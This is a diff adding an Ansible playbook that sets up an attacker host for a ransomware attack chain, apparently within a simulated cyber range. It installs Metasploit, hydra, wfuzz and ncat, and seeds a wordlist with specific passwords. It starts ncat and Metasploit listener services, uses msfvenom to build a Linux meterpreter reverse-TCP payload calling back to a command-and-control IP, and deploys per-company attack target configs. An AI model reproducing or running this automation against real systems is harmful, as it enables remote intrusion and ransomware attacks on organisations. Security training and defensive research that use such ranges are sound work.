@@ -1,0 +1,152 @@
+---
+- name: Get all host facts
+  hosts: all
+  gather_facts: true
+
+- name: Install essential software for malware hosts
+  tags: [ransomware]
+  hosts: attacker_0
+  tasks:
+    - name: Create attack directory
+      become: true
+      ansible.builtin.file:
+        path: /opt/ransomware_mail/
+        state: directory
+        mode: "0755"
+
+    - name: Update apt cache
+      become: true
+      ansible.builtin.apt:
+        update_cache: true
+        cache_valid_time: 3600
+
+    - name: Install basic software
+      become: true
+      ansible.builtin.apt:
+        name: [nmap, wfuzz, hydra, ncat, libxcb-image0, python3-tk, python3-pip]
+        state: present
+      tags: [install]
+    - name: Install pycryptodome
+      become: true
+      ansible.builtin.pip:
+        name: pycryptodome,pyinstaller,shodan,BeautifulSoup4
+
+    - name: Add passwords to wfuzz
+      become: true
+      ansible.builtin.lineinfile:
+        path: /usr/share/wfuzz/wordlist/general/common.txt
+        line: "{{ item }}"
+        state: present
+      with_items: [ScadaBR, ap2021dias]
+    - name: Download metasploit installer msfinstall
+      become: true
+      ansible.builtin.get_url:
+        url: https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
+        dest: /tmp/msfinstall
+        mode: "0755"
+
+    - name: Install Metasploit via msfinstall
+      become: true
+      ansible.builtin.command:
+        cmd: /tmp/msfinstall
+        creates: /opt/metasploit-framework/bin
+
+- name: MAIL Ransomware (Attacker 0)
+  hosts: attacker_0
+  tasks:
+    - name: Copy Attack chain
+      become: true
+      ansible.builtin.copy:
+        src: attacker_0/ncat.sh
+        dest: /opt/ransomware_mail/ncat.sh
+        mode: "0755"
+
+    - name: Copy nmap service to host
+      become: true
+      ansible.builtin.copy:
+        src: attacker_0/auto-ncat.service
+        dest: /lib/systemd/system/auto-ncat.service
+
+    - name: Copy observer to host
+      become: true
+      ansible.builtin.copy:
+        src: attacker_0/observe_reverse_shell.sh
+        dest: /opt/ransomware_mail/02_observe_reverse_shell.sh
+        mode: "0755"
+
+    - name: Reload systemd and start nmap
+      become: true
+      ansible.builtin.systemd:
+        daemon_reload: true
+        name: auto-ncat
+        state: started
+
+    - name: Manage ncat output file
+      become: true
+      ansible.builtin.file:
+        dest: /opt/ransomware_mail/ransomw-keys.txt
+        mode: "0666"
+        state: touch
+
+    - name: Deploy msf-loader
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ransomware_mail/msf-loader
+        src: msf-loader.j2
+        mode: "0644"
+
+    - name: Deploy autoexec
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ransomware_mail/autoexec
+        src: autoexec.j2
+        mode: "0644"
+
+    # Ransom MAIL
+    - name: Metasploit attacker service
+      become: true
+      ansible.builtin.template:
+        src: metasploit-attacker.service.j2
+        dest: /lib/systemd/system/metasploit-attacker.service
+
+    - name: Reload systemd and start metasploit-attacker
+      become: true
+      ansible.builtin.systemd:
+        daemon_reload: true
+        name: metasploit-attacker
+        state: started
+
+    - name: Create exploit via msfvenom
+      become: true
+      vars:
+        exploit_path_mail: /opt/ransomware_mail/{{ exploit_filename_mail }}
+      ansible.builtin.shell:
+        cmd: >
+          msfvenom -p linux/x64/meterpreter/reverse_tcp
+          LHOST={{ attacker_cc_metasploit_ip_mail }}
+          LPORT={{ attacker_cc_port_mail }} -f elf > {{ exploit_path_mail }}
+        chdir: /opt/ransomware_mail/
+        creates: "{{ exploit_path_mail }}"
+
+    - name: Metasploit attacker service
+      become: true
+      ansible.builtin.template:
+        src: "01_upload_shell.sh.j2"
+        dest: /opt/ransomware_mail/01_upload_shell.sh
+        mode: "0755"
+
+    - name: Create attack target directories
+      become: true
+      ansible.builtin.file:
+        state: directory
+        path: /opt/ransomware_mail/configs/
+
+    - name: Deploy attack target configs
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ransomware_mail/configs/{{ company }}
+        src: config.j2
+        mode: "0644"
+      loop: "{{ company_names }}"
+      loop_control:
+        loop_var: company
